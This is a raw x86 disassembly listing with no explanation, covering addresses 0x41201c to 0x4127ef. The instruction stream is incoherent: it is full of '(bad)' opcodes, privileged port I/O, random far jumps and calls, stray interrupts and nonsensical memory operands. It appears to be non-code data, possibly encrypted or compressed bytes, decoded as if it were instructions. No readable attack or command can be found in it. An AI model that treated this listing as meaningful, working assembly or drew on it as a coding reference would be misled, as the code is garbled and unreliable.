  41201c:	popa   
  41201d:	add    ebx,DWORD PTR [edi-0x362625a1]
  412023:	enter  0x8304,0x21
  412027:	iret   
  412028:	aad    0x62
  41202a:	mov    ds,eax
  41202c:	xor    BYTE PTR [ebp+0x3f52b83c],0x3f
  412033:	mov    al,BYTE PTR [ebx+ecx*8-0x73]
  412037:	push   0x2e76f802
  41203c:	xchg   esp,eax
  41203d:	jo     0x412057
  41203f:	adc    BYTE PTR [edi],ah
  412041:	mov    ah,0x61
  412043:	fdiv   st,st(3)
  412045:	dec    eax
  412046:	data16 or BYTE PTR [ecx+esi*1+0x27],bl
  41204b:	mov    BYTE PTR ds:0xaa797eef,al
  412051:	dec    esi
  412052:	or     ebx,ebx
  412054:	jbe    0x412091
  412056:	int3   
  412057:	rcl    cl,1
  412059:	call   0xe8cb4e7a
  41205e:	hlt    
  41205f:	test   edx,ebp
  412061:	fstp   TBYTE PTR [ebp-0x4b]
  412064:	icebp  
  412065:	or     ah,BYTE PTR [esi+0x42153def]
  41206b:	bound  ebp,QWORD PTR [edx]
  41206d:	call   FWORD PTR [edx+0x2a]
  412070:	mov    BYTE PTR ds:0xa1211130,ch
  412076:	cmp    al,0xe5
  412078:	jmp    0x4c90:0xb4498c25
  41207f:	sub    cl,cl
  412081:	ror    BYTE PTR [esp+ecx*2+0x60],cl
  412085:	pop    es
  412086:	mov    ebp,0xa931a224
  41208b:	jp     0x4120ab
  41208d:	imul   edi,DWORD PTR [ebx-0x27b3e4ce],0xffffffbe
  412094:	push   ebx
  412095:	mov    al,BYTE PTR [ebx-0x7f37e972]
  41209b:	mov    eax,ds:0x1654eee8
  4120a0:	mov    ecx,0x2fd33995
  4120a5:	test   BYTE PTR [ecx+0x4ad39ace],al
  4120ab:	mov    WORD PTR [ecx],gs
  4120ad:	dec    edx
  4120ae:	mov    bh,0x39
  4120b0:	push   0x1f
  4120b2:	clc    
  4120b3:	shl    BYTE PTR ds:0xb57f7798,cl
  4120b9:	loop   0x4120ce
  4120bb:	sbb    esi,DWORD PTR [esi+0x51]
  4120be:	out    0x9a,al
  4120c0:	and    dl,ch
  4120c2:	sbb    eax,0x1c2cb28b
  4120c7:	jbe    0x4120aa
  4120c9:	mov    dh,0xd
  4120cb:	cmp    al,0xd7
  4120cd:	dec    ebp
  4120ce:	into   
  4120cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120d0:	into   
  4120d1:	xchg   BYTE PTR [eax+0x151725e5],ah
  4120d7:	xor    DWORD PTR [edx],ebx
  4120d9:	dec    ebp
  4120da:	gs inc edi
  4120dc:	int3   
  4120dd:	out    dx,eax
  4120de:	cmovg  ecx,DWORD PTR [ebp+ebx*8-0x1e]
  4120e3:	and    BYTE PTR [eax+ecx*4-0x7d],al
  4120e7:	sub    BYTE PTR [ebx+0xb],0xbe
  4120eb:	sbb    eax,0x2113a1d7
  4120f0:	scas   al,BYTE PTR es:[edi]
  4120f1:	aas    
  4120f2:	mov    esi,0xd05e4c14
  4120f7:	adc    ecx,0xa9218c3
  4120fd:	jecxz  0x4120a0
  4120ff:	frstor [ebx+esi*8]
  412102:	dec    ecx
  412103:	mov    ebp,eax
  412105:	(bad)  
  412106:	sbb    ecx,esp
  412108:	pop    edi
  412109:	pop    ecx
  41210a:	je     0x4120ec
  41210c:	outs   dx,DWORD PTR ds:[esi]
  41210d:	sbb    ebp,0x5d
  412110:	xchg   edi,eax
  412111:	scas   eax,DWORD PTR es:[edi]
  412112:	mov    ah,0xc8
  412114:	add    DWORD PTR [ecx],ebx
  412116:	adc    BYTE PTR [edi],dl
  412118:	lahf   
  412119:	sub    al,0xbd
  41211b:	and    esi,esi
  41211d:	xchg   BYTE PTR [edx],bh
  41211f:	pusha  
  412120:	mov    ecx,eax
  412122:	add    ecx,edi
  412124:	push   edi
  412125:	test   eax,0x1c2f0955
  41212a:	add    esi,DWORD PTR [edx+0x61f850b3]
  412130:	sbb    bl,BYTE PTR [ecx]
  412132:	xchg   esp,edi
  412134:	aaa    
  412135:	mov    bh,0xda
  412137:	(bad)  
  412138:	in     eax,dx
  412139:	inc    ebx
  41213a:	aaa    
  41213b:	mov    ebx,0xd78af79b
  412140:	push   ds
  412141:	adc    BYTE PTR [edx+0x7e0fd5e1],0x9e
  412148:	mov    ebx,0x828067b1
  41214d:	and    DWORD PTR [edx-0x24],ebx
  412150:	das    
  412151:	mov    WORD PTR [ebx-0x64],gs
  412154:	cmp    al,0x88
  412156:	pop    ecx
  412157:	jne    0x41218a
  412159:	ins    DWORD PTR es:[edi],dx
  41215a:	pop    ecx
  41215b:	outs   dx,DWORD PTR ds:[esi]
  41215c:	in     eax,dx
  41215d:	mov    BYTE PTR [ebp-0x4d6af13b],bh
  412163:	mov    WORD PTR [edi],es
  412165:	pop    DWORD PTR [ebx]
  412167:	fisttp DWORD PTR [edi-0x1f008185]
  41216d:	(bad)  
  41216e:	loopne 0x41219e
  412170:	pand   mm1,mm5
  412173:	mov    al,ds:0xe6c9e3cb
  412178:	pop    ebx
  412179:	cld    
  41217a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41217b:	pcmpgtw mm3,QWORD PTR es:[eax-0x1f056383]
  412183:	jne    0x412197
  412185:	into   
  412186:	jp     0x4121d2
  412188:	and    eax,0xb8e02adf
  41218d:	mov    ebp,0x656f53c5
  412192:	fcomp  QWORD PTR [eax+0x54]
  412195:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412196:	int    0xee
  412198:	mov    eax,0xf9a5b159
  41219d:	ins    BYTE PTR es:[edi],dx
  41219e:	mov    ch,0xc
  4121a0:	jmp    0xaf3d3b1d
  4121a5:	(bad)  
  4121a6:	push   ds
  4121a7:	cmp    eax,0xfdd8558
  4121ac:	lds    eax,FWORD PTR [ebp+0x2237e4b1]
  4121b2:	or     ebx,DWORD PTR [ebp+0x79]
  4121b5:	out    dx,al
  4121b6:	push   edi
  4121b7:	or     ecx,DWORD PTR [edi+0x4c]
  4121ba:	ret    
  4121bb:	iret   
  4121bc:	push   ecx
  4121bd:	or     edi,DWORD PTR [ecx+0x68513eff]
  4121c3:	push   ss
  4121c4:	retf   0xb23f
  4121c7:	imul   edi,esp,0x34
  4121ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121cb:	add    DWORD PTR [ecx],edi
  4121cd:	mov    DWORD PTR [esi],ebx
  4121cf:	gs jmp 0xc4d0:0x9af93157
  4121d7:	dec    esi
  4121d8:	dec    esp
  4121d9:	pmuludq mm1,QWORD PTR [esi+ebp*1-0x25]
  4121de:	push   eax
  4121df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121e0:	pop    esp
  4121e1:	jg     0x412228
  4121e3:	dec    esp
  4121e4:	push   cs
  4121e5:	inc    esp
  4121e6:	xor    BYTE PTR [esi-0x2de1a43e],bl
  4121ec:	sbb    BYTE PTR [esi-0x3d],dl
  4121ef:	icebp  
  4121f0:	dec    esp
  4121f1:	xchg   ebx,eax
  4121f2:	cmp    DWORD PTR [edi-0xf37c188],0x4805abb1
  4121fc:	scas   al,BYTE PTR es:[edi]
  4121fd:	into   
  4121fe:	repnz fcom DWORD PTR [esp+ebp*1-0x6a12167c]
  412206:	jnp    0x4121dc
  412208:	stos   BYTE PTR es:[edi],al
  412209:	js     0x412237
  41220b:	rep ins BYTE PTR es:[edi],dx
  41220d:	outs   dx,BYTE PTR ds:[esi]
  41220e:	int    0x2e
  412210:	cmp    DWORD PTR [edx-0x2c],esi
  412213:	bound  ecx,QWORD PTR [ecx+0x71]
  412216:	add    BYTE PTR [edi+0x7f],bl
  412219:	call   DWORD PTR [edx+eiz*4+0x8]
  41221d:	fisubr DWORD PTR [edi-0x18]
  412220:	je     0x412235
  412222:	pop    eax
  412223:	pop    ebp
  412224:	stos   BYTE PTR es:[edi],al
  412225:	clc    
  412226:	sbb    eax,0xccee0706
  41222b:	outs   dx,DWORD PTR ds:[esi]
  41222c:	sub    esi,edx
  41222e:	dec    eax
  41222f:	adc    DWORD PTR [edx-0x60e5c575],edx
  412235:	inc    edi
  412236:	push   eax
  412237:	fidivr DWORD PTR [eax]
  412239:	mov    edi,0x861a5d
  41223e:	int    0x37
  412240:	hlt    
  412241:	or     eax,esp
  412243:	push   ss
  412244:	push   eax
  412245:	mov    ebx,0x9e74901a
  41224a:	int3   
  41224b:	(bad)  
  41224c:	mov    ebp,0xeb3da941
  412251:	cmp    eax,0xf53cb455
  412256:	rcl    DWORD PTR [edi],cl
  412258:	ja     0x412262
  41225a:	ret    
  41225b:	mov    edx,0xfeaf35ee
  412260:	sub    ebp,eax
  412262:	mov    cl,0xdd
  412264:	and    DWORD PTR [esi+0x3938ebdf],ecx
  41226a:	and    dh,ah
  41226c:	dec    ebx
  41226d:	inc    ecx
  41226e:	inc    edx
  41226f:	daa    
  412270:	jg     0x412295
  412272:	jg     0x412210
  412274:	hlt    
  412275:	ret    
  412276:	lahf   
  412277:	cmp    DWORD PTR ds:0x1b4ac2ef,esp
  41227d:	lds    edx,FWORD PTR [edx-0x6c]
  412280:	pop    ebx
  412281:	and    eax,0xefeb13db
  412286:	xchg   ecx,eax
  412287:	dec    edx
  412288:	lds    edi,FWORD PTR [edx]
  41228a:	div    DWORD PTR [esi+0x55]
  41228d:	in     al,dx
  41228e:	inc    esp
  41228f:	daa    
  412290:	adc    eax,0x5233a65f
  412295:	out    0xa3,eax
  412297:	bound  ebp,QWORD PTR [edi-0x79]
  41229a:	fldenv [esi]
  41229c:	and    edx,0x7d64a9bf
  4122a2:	pop    es
  4122a3:	ret    0x3375
  4122a6:	or     edx,esi
  4122a8:	xor    eax,0xd50a7356
  4122ad:	push   es
  4122ae:	fld    TBYTE PTR [esi]
  4122b0:	add    cl,BYTE PTR [edi+0x45d0e3a5]
  4122b6:	push   edx
  4122b7:	fimul  DWORD PTR cs:[esi]
  4122ba:	fist   DWORD PTR [edx]
  4122bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122bd:	js     0x412326
  4122bf:	jae    0x41225f
  4122c1:	bound  ecx,QWORD PTR [eax+0x2636208a]
  4122c7:	div    BYTE PTR [ebp+0x14]
  4122ca:	shl    al,0xb6
  4122cd:	mov    ebx,0x65bfa5c
  4122d2:	pop    es
  4122d3:	int    0xe3
  4122d5:	inc    ebx
  4122d6:	mov    dl,0xc3
  4122d8:	pusha  
  4122d9:	test   BYTE PTR [esi],0x83
  4122dc:	or     dl,al
  4122de:	lea    ebp,[ecx]
  4122e0:	push   ebp
  4122e1:	jge    0x412290
  4122e3:	add    eax,0x7dcb8b88
  4122e8:	push   0x3e16728b
  4122ed:	aad    0xc3
  4122ef:	fsubr  QWORD PTR ss:[edx-0x6105d8c5]
  4122f6:	or     bh,BYTE PTR [esi+0x14028056]
  4122fc:	call   0xa9e012ca
  412301:	rol    dh,cl
  412303:	pusha  
  412304:	xor    ebx,edx
  412306:	mov    esi,0xcb46058d
  41230b:	cmp    al,0x5f
  41230d:	aam    0x4
  41230f:	sub    al,0x9d
  412311:	add    BYTE PTR [eax-0x6b],bh
  412314:	arpl   WORD PTR [edi+0x13947fb0],di
  41231a:	push   esi
  41231b:	adc    al,0xe9
  41231d:	lods   al,BYTE PTR ds:[esi]
  41231e:	lea    esp,[ebx+ebx*4]
  412321:	or     esp,eax
  412323:	xchg   ecx,ebp
  412325:	pushf  
  412326:	cmp    al,0x8
  412328:	push   esi
  412329:	sbb    DWORD PTR [ecx+0x36],0x2824a800
  412330:	bound  esi,QWORD PTR [ebx+0x627c5a45]
  412336:	scas   eax,DWORD PTR es:[edi]
  412337:	fnstsw WORD PTR [ebx]
  412339:	sbb    edx,ebp
  41233b:	sbb    al,0x3f
  41233d:	(bad)  
  41233e:	or     DWORD PTR [ecx+esi*2-0x4a],ebp
  412342:	fwait
  412343:	mov    BYTE PTR [edi-0x4c62abbc],ch
  412349:	push   ebx
  41234a:	les    ebp,FWORD PTR [esi-0x7b]
  41234d:	push   ds
  41234e:	mov    ebp,0x3922ce86
  412353:	mov    ch,0x39
  412355:	push   esi
  412356:	push   0x1be5c7bf
  41235b:	add    eax,0x7da5db1
  412360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412361:	add    esp,DWORD PTR [ecx+0x64]
  412364:	xchg   edi,eax
  412365:	jno    0x412334
  412367:	xchg   esp,eax
  412368:	mov    dl,0x5e
  41236a:	div    DWORD PTR [edi]
  41236c:	and    edi,edx
  41236e:	or     edx,esp
  412370:	(bad)  
  412371:	int    0x16
  412373:	adc    bl,BYTE PTR [ecx]
  412375:	dec    ebp
  412376:	adc    dh,ah
  412378:	dec    ebp
  412379:	add    ah,ch
  41237b:	push   edx
  41237c:	inc    esp
  41237d:	nop
  41237e:	adc    eax,0xfc9d8b61
  412383:	cs dec edx
  412385:	out    dx,al
  412386:	jne    0x412378
  412388:	or     cl,BYTE PTR [ecx+esi*8-0x1e]
  41238c:	pop    ss
  41238d:	int3   
  41238e:	lea    esi,[esi+0x3953fafe]
  412394:	cdq    
  412395:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412396:	push   es
  412397:	lock push cs
  412399:	bnd je 0x4123d6
  41239c:	xor    DWORD PTR [ecx+eiz*8],esp
  41239f:	sbb    dl,ah
  4123a1:	jp     0x41237a
  4123a3:	pop    ebp
  4123a4:	(bad)  
  4123a6:	cmp    cl,BYTE PTR [edx+ebp*1]
  4123a9:	sahf   
  4123aa:	aam    0xc2
  4123ac:	and    al,BYTE PTR [eax+0x1e]
  4123af:	lock add BYTE PTR [esi+ebp*8+0x43],dl
  4123b4:	test   esp,0x78c21339
  4123ba:	sub    DWORD PTR [eax+0x6673fe97],edx
  4123c0:	popa   
  4123c1:	loopne 0x412351
  4123c3:	mov    eax,0x8ea08e23
  4123c8:	retf   
  4123c9:	fisubr DWORD PTR [ebx]
  4123cb:	pop    ebp
  4123cc:	sbb    eax,ebp
  4123ce:	imul   esp,eax,0xec07027
  4123d4:	test   BYTE PTR [ecx-0x3428d3ae],0x25
  4123db:	add    DWORD PTR [ebx+edx*2+0x55],eax
  4123df:	mov    ds:0x15af9c43,al
  4123e4:	int    0x21
  4123e6:	xchg   edi,eax
  4123e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123e8:	mov    BYTE PTR [edi-0x60e4df6d],0x77
  4123ef:	out    0x2c,al
  4123f1:	loope  0x412389
  4123f3:	mov    esp,0x10c5a3c3
  4123f8:	imul   esp,DWORD PTR [ecx+0x2d],0x71
  4123fc:	xor    BYTE PTR [edx+eax*4],dh
  4123ff:	push   esi
  412400:	sbb    DWORD PTR [edx+0x42],eax
  412403:	cmp    eax,0xe8ec9e59
  412408:	shr    DWORD PTR [esi+0x3e3d9cb5],cl
  41240e:	test   BYTE PTR [esi-0x11],bl
  412411:	mov    al,ds:0x8d6807b
  412416:	(bad)  
  412417:	aas    
  412418:	stos   BYTE PTR es:[edi],al
  412419:	cmp    DWORD PTR [ebx-0x9dbd537],edi
  41241f:	ja     0x412425
  412421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412422:	mov    ebp,0x175f7b2
  412427:	push   ebp
  412428:	push   ebp
  412429:	inc    esp
  41242a:	xchg   ebx,eax
  41242b:	or     BYTE PTR [edi],cl
  41242d:	adc    DWORD PTR [edx],eax
  41242f:	push   es
  412430:	out    0xf,eax
  412432:	jb     0x4123f5
  412434:	imul   DWORD PTR [edi+0x38]
  412437:	pushf  
  412438:	inc    ebx
  412439:	inc    DWORD PTR [edx-0xc2dd117]
  41243f:	sub    BYTE PTR [edx+0x7d],0x5a
  412443:	mov    ebp,0x1cc8e658
  412448:	mov    ch,0x29
  41244a:	xchg   ecx,eax
  41244b:	je     0x412460
  41244d:	icebp  
  41244e:	ret    0xac97
  412451:	sub    ebp,0xfbade02a
  412457:	in     al,dx
  412458:	xor    ecx,esp
  41245a:	mov    DWORD PTR [ecx+eiz*4-0x1],esp
  41245e:	stos   BYTE PTR es:[edi],al
  41245f:	jge    0x412468
  412461:	sbb    al,BYTE PTR [ebp+0x3d60ac80]
  412467:	jp     0x4124ab
  412469:	dec    esp
  41246a:	enter  0xa1df,0xe
  41246e:	jmp    0x81ec1809
  412473:	fnstenv [ebx+ebp*8-0x7d8c4754]
  41247a:	xchg   edi,eax
  41247b:	cld    
  41247c:	xchg   esi,eax
  41247d:	(bad)  
  41247e:	retf   0x8fb6
  412481:	sahf   
  412482:	pop    es
  412483:	mov    dl,0x9d
  412485:	loopne 0x412477
  412487:	adc    bl,BYTE PTR [ebx]
  412489:	scas   al,BYTE PTR es:[edi]
  41248a:	aas    
  41248b:	cli    
  41248c:	in     eax,dx
  41248d:	shl    BYTE PTR [esi],cl
  41248f:	nop    ebp
  412492:	cmp    ah,BYTE PTR ds:0xa919ac5b
  412498:	and    ebx,DWORD PTR [ebx]
  41249a:	inc    edx
  41249b:	cmp    eax,DWORD PTR [eax-0x4b]
  41249e:	inc    ebp
  41249f:	repnz das 
  4124a1:	lods   al,BYTE PTR ds:[esi]
  4124a2:	nop
  4124a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124a4:	jbe    0x412438
  4124a6:	sti    
  4124a7:	mov    dl,0x6a
  4124a9:	ins    DWORD PTR es:[edi],dx
  4124aa:	cmp    al,0x87
  4124ac:	adc    BYTE PTR [ebp+ebp*2-0x4c],bh
  4124b0:	pop    es
  4124b1:	sub    ch,ch
  4124b3:	loopne 0x412453
  4124b5:	sub    al,0x21
  4124b7:	adc    eax,0x606425e1
  4124bc:	pop    ebp
  4124bd:	jge    0x412510
  4124bf:	sbb    ah,0x98
  4124c2:	pop    ebx
  4124c3:	fdivr  DWORD PTR [bx+di-0x5]
  4124c7:	neg    DWORD PTR ds:[edi+0x25]
  4124cb:	pop    eax
  4124cc:	stos   BYTE PTR es:[edi],al
  4124cd:	push   ebp
  4124ce:	ins    BYTE PTR es:[edi],dx
  4124cf:	pop    edx
  4124d0:	repz jp 0x4124ed
  4124d3:	scas   al,BYTE PTR es:[edi]
  4124d4:	test   eax,0x413f6af6
  4124d9:	push   eax
  4124da:	pop    edi
  4124db:	jbe    0x4124d2
  4124dd:	int    0x70
  4124df:	sub    eax,0x2c2da41c
  4124e4:	jge    0x412498
  4124e6:	and    BYTE PTR [edx],al
  4124e8:	jmp    0x40a8:0x468e0602
  4124ef:	push   es
  4124f0:	adc    BYTE PTR [ebp-0x10],ah
  4124f3:	sbb    DWORD PTR [edx+0x544d142],ebx
  4124f9:	pop    ecx
  4124fa:	or     eax,0xca830d31
  4124ff:	aam    0xf2
  412501:	mov    al,0xd9
  412503:	test   al,0x51
  412505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412506:	add    edx,ebx
  412508:	fild   QWORD PTR [edx-0x24]
  41250c:	adc    eax,0xb0cc283b
  412511:	sbb    al,0x2f
  412513:	out    dx,eax
  412514:	push   esp
  412515:	push   esp
  412516:	inc    edx
  412517:	and    al,0xee
  412519:	fisttp DWORD PTR [ecx+0x4c31f19f]
  41251f:	dec    esi
  412520:	mov    eax,0x59fca094
  412525:	xlat   BYTE PTR ds:[ebx]
  412526:	mov    edx,0x656d5863
  41252b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41252c:	cmp    esp,DWORD PTR [edx-0x13]
  41252f:	stc    
  412530:	pop    edi
  412531:	lock mov ah,0x8a
  412534:	cmp    eax,0x53b5c6cb
  412539:	scas   al,BYTE PTR es:[edi]
  41253a:	jno    0x4125a1
  41253c:	xor    BYTE PTR [ebx-0x64784c55],al
  412542:	jns    0x4124f8
  412544:	bound  ecx,QWORD PTR [edi+0x7a]
  412547:	mov    edx,0x5f97254d
  41254c:	mov    BYTE PTR [esi],ah
  41254e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41254f:	mov    DWORD PTR [esi],edx
  412551:	mov    edi,0x8e64b4d0
  412556:	test   BYTE PTR [edi],dh
  412558:	test   eax,0xde8e3da7
  41255d:	sbb    DWORD PTR [ecx-0x9],ecx
  412560:	sub    dl,BYTE PTR [edi+0x51]
  412563:	sbb    BYTE PTR [ebx-0x5a],ah
  412566:	jl     0x412582
  412568:	mov    ds:0x6b5e6550,eax
  41256d:	adc    ebx,edx
  41256f:	imul   edx,DWORD PTR [edi-0x45],0xa0ad4c78
  412576:	adc    dh,al
  412578:	iret   
  412579:	jbe    0x4125c7
  41257b:	sub    BYTE PTR [esi-0x4dea931f],cl
  412581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412582:	and    al,0x4b
  412584:	cmc    
  412585:	inc    edx
  412586:	in     al,0x46
  412588:	cdq    
  412589:	addr16 (bad) 
  41258b:	ins    BYTE PTR es:[edi],dx
  41258c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41258d:	sub    bh,BYTE PTR [ecx]
  41258f:	jmp    0x4125f2
  412591:	jecxz  0x412525
  412593:	(bad)
  412598:	test   DWORD PTR [edi],ecx
  41259a:	sbb    al,0xdf
  41259c:	loope  0x412617
  41259e:	stc    
  41259f:	ret    0x59b3
  4125a2:	leave  
  4125a3:	sti    
  4125a4:	push   edx
  4125a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125a6:	or     al,0xb6
  4125a8:	and    dh,BYTE PTR [edi+ebp*2-0x2]
  4125ac:	shl    BYTE PTR ds:0xedd,0x3d
  4125b2:	add    ebx,ecx
  4125b4:	pop    ss
  4125b5:	pop    es
  4125b6:	jge    0x412606
  4125b8:	jg     0x412606
  4125ba:	loopne 0x4125d3
  4125bc:	(bad)  
  4125bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125be:	out    dx,al
  4125bf:	(bad)  
  4125c1:	pop    ds
  4125c2:	xchg   ecx,eax
  4125c3:	dec    ebp
  4125c4:	cdq    
  4125c5:	add    eax,0x16886be4
  4125ca:	ja     0x412555
  4125cc:	dec    ebp
  4125cd:	out    dx,eax
  4125ce:	inc    ebp
  4125cf:	lock sub al,BYTE PTR [eax+0x63cad1b3]
  4125d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125d8:	jg     0x4125fb
  4125da:	xor    eax,0x8cf3a739
  4125df:	dec    ebp
  4125e0:	retf   
  4125e1:	or     BYTE PTR [eax],al
  4125e3:	push   edi
  4125e4:	mov    esi,0xcd18a02
  4125e9:	dec    ebx
  4125ea:	out    dx,eax
  4125eb:	dec    ebx
  4125ec:	imul   edi,DWORD PTR [edi],0xfffffffb
  4125ef:	aam    0xd
  4125f1:	jecxz  0x4125d1
  4125f3:	ins    BYTE PTR es:[edi],dx
  4125f4:	jnp    0x41263f
  4125f6:	sbb    al,0x87
  4125f8:	pusha  
  4125f9:	pop    edi
  4125fa:	out    dx,al
  4125fb:	mov    al,0x12
  4125fd:	mov    edi,0xb71fffb9
  412602:	or     eax,0xfcb45c87
  412607:	fidiv  WORD PTR [edi-0x171f07c6]
  41260d:	rcr    DWORD PTR [ebx+0x21f7dcad],0x1d
  412614:	neg    esp
  412616:	and    DWORD PTR [eax+ecx*2+0x6a894ab],esi
  41261d:	dec    ebp
  41261e:	loop   0x4125ab
  412620:	cmp    ebp,DWORD PTR [ebx+0x207cff8a]
  412626:	inc    ecx
  412627:	lock mov cl,0x90
  41262a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41262b:	mov    esi,0xdf2c0631
  412630:	shl    DWORD PTR [ebx-0x54],0xf8
  412634:	or     dl,BYTE PTR [ecx+0x5a]
  412637:	lea    ebx,[esi+ebp*2+0x7f]
  41263b:	mov    ecx,0xb495530b
  412640:	mov    ebp,0x1274a7a5
  412645:	ins    BYTE PTR es:[edi],dx
  412646:	in     eax,0x53
  412648:	mov    eax,ecx
  41264a:	lods   al,BYTE PTR ds:[esi]
  41264b:	icebp  
  41264c:	inc    edx
  41264d:	fstp   DWORD PTR [eax]
  41264f:	out    dx,eax
  412650:	sub    eax,0x144e75df
  412655:	fiadd  WORD PTR [edi-0x7eda981c]
  41265b:	dec    ecx
  41265c:	shl    ah,0xbf
  41265f:	or     bh,ah
  412661:	pushf  
  412662:	jne    0x412645
  412664:	adc    eax,0x692d5347
  412669:	or     BYTE PTR [edx+edx*1+0x28],0xd3
  41266e:	mov    BYTE PTR [edx+0x66],0x38
  412672:	jl     0x412699
  412674:	and    eax,0xe0816d81
  412679:	int3   
  41267a:	addr16 jge 0x41268e
  41267d:	in     al,0x22
  41267f:	sahf   
  412680:	aad    0x20
  412682:	mov    ss,WORD PTR [eax]
  412684:	mov    ebx,0x3dc41122
  412689:	dec    ebp
  41268a:	inc    edx
  41268b:	push   ss
  41268c:	mov    al,BYTE PTR [ebx]
  41268e:	(bad)  
  41268f:	mov    ecx,0x917c2ef0
  412694:	xor    BYTE PTR [eax+0x35],0x71
  412698:	mov    ch,0xee
  41269a:	mov    edi,0xf50da4c9
  41269f:	and    al,0x30
  4126a1:	adc    esp,eax
  4126a3:	aas    
  4126a4:	inc    ebp
  4126a5:	js     0x412711
  4126a7:	mov    ah,0x25
  4126a9:	add    al,0xe2
  4126ab:	sar    DWORD PTR [eax-0x57],1
  4126ae:	dec    ebx
  4126af:	xchg   ebp,eax
  4126b0:	mov    dl,0x4e
  4126b2:	test   DWORD PTR [ebp-0x72],ecx
  4126b5:	jge    0x4126c6
  4126b7:	push   0x545eba69
  4126bc:	push   ebx
  4126bd:	pop    ebp
  4126be:	push   eax
  4126bf:	into   
  4126c0:	cs out dx,eax
  4126c2:	mov    ah,0xd6
  4126c4:	not    BYTE PTR [ebx-0x4dbbe0a9]
  4126ca:	nop
  4126cb:	jo     0x412659
  4126cd:	mov    ebx,0x54ff02fd
  4126d2:	mov    BYTE PTR [eax+0x22],dl
  4126d5:	pop    ss
  4126d6:	mov    eax,ds:0x23c20982
  4126db:	inc    eax
  4126dc:	cmp    DWORD PTR [edi-0x4a381fd],edi
  4126e2:	push   es
  4126e3:	mov    edx,ebp
  4126e5:	and    DWORD PTR [esi],0xffffffef
  4126e8:	xchg   BYTE PTR ds:0x5a36603e,dh
  4126ee:	jae    0x412703
  4126f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126f1:	aas    
  4126f2:	clc    
  4126f3:	rol    BYTE PTR [ebx-0x6ae593d8],1
  4126f9:	into   
  4126fa:	xlat   BYTE PTR ds:[ebx]
  4126fb:	xor    BYTE PTR [esi-0x23],bl
  4126fe:	sbb    bh,cl
  412700:	dec    esp
  412701:	xchg   DWORD PTR [esi],esp
  412703:	ss retf 
  412705:	and    al,0x3e
  412707:	jle    0x412787
  412709:	adc    eax,0xf8394a7f
  41270f:	cwde   
  412710:	sbb    BYTE PTR [esi+0x7951bbc1],0x95
  412717:	jp     0x412774
  412719:	(bad)  
  41271a:	mov    ebx,0x663c06db
  41271f:	jecxz  0x4126bd
  412721:	dec    edi
  412722:	inc    esi
  412723:	cdq    
  412724:	call   0xa9daa22a
  412729:	push   eax
  41272a:	repnz xchg ebp,eax
  41272c:	jo     0x41273c
  41272e:	jbe    0x4127a7
  412730:	test   al,0xcf
  412732:	stos   DWORD PTR es:[edi],eax
  412733:	and    eax,0x958cb9d4
  412738:	or     al,0x68
  41273a:	sbb    DWORD PTR [esi+eiz*8],ebp
  41273d:	mov    eax,ds:0xfc9badd9
  412742:	mov    ds:0x82544af,al
  412747:	jmp    0x94fdf8d2
  41274c:	push   edi
  41274d:	push   ecx
  41274e:	dec    edx
  41274f:	or     ebx,DWORD PTR [ebx-0x12]
  412752:	test   DWORD PTR [ebx+0x65],ebp
  412755:	jae    0x412709
  412757:	sbb    eax,0x22213c02
  41275c:	iret   
  41275d:	pop    ebx
  41275e:	mov    eax,0x519658b1
  412763:	mov    ch,0x21
  412765:	mov    ds:0x75567f51,al
  41276a:	adc    eax,0x199f8f21
  41276f:	cld    
  412770:	pop    esi
  412771:	es mov ch,0xed
  412774:	dec    ebp
  412775:	jecxz  0x412764
  412777:	call   0x17f:0xf744ec4c
  41277e:	dec    esi
  41277f:	ss push cs
  412781:	pop    ss
  412782:	sub    dh,BYTE PTR [ebp-0x3e]
  412785:	stc    
  412786:	adc    al,0xab
  412788:	jle    0x41277c
  41278a:	mov    ds:0xf51d4467,al
  41278f:	btc    DWORD PTR [ebp+0x21214821],ebx
  412796:	sbb    esp,edi
  412798:	into   
  412799:	add    DWORD PTR [edx-0x36],ebx
  41279c:	sub    bh,bl
  41279e:	pop    edx
  41279f:	sbb    eax,0x914ccc0e
  4127a4:	pop    es
  4127a5:	retf   0x278e
  4127a8:	lea    esp,[ebp+0x1e]
  4127ab:	fdivr  QWORD PTR [esi+ebp*2]
  4127ae:	xchg   DWORD PTR [ebp-0x45],eax
  4127b1:	cld    
  4127b2:	outs   dx,DWORD PTR ds:[esi]
  4127b3:	outs   dx,DWORD PTR ds:[esi]
  4127b4:	pop    ds
  4127b5:	in     al,dx
  4127b6:	xchg   edx,eax
  4127b7:	inc    BYTE PTR [eax+0x679a290c]
  4127bd:	aam    0xfe
  4127bf:	mov    ah,dl
  4127c1:	jg     0x4127bb
  4127c3:	push   esp
  4127c4:	dec    edx
  4127c5:	push   edx
  4127c6:	loop   0x412828
  4127c8:	das    
  4127c9:	push   0x3b0a17b3
  4127ce:	faddp  st(1),st
  4127d0:	inc    edx
  4127d1:	mov    esp,0x8ed629ae
  4127d6:	dec    eax
  4127d7:	mov    esi,0x223d0598
  4127dc:	mov    ecx,0x3743cbc5
  4127e1:	gs pop eax
  4127e3:	(bad)  
  4127e4:	loop   0x412818
  4127e6:	loope  0x412851
  4127e8:	pop    ss
  4127e9:	mov    ebp,0x5a7b2bb7
  4127ee:	push   ss
  4127ef:	jns    0x412835
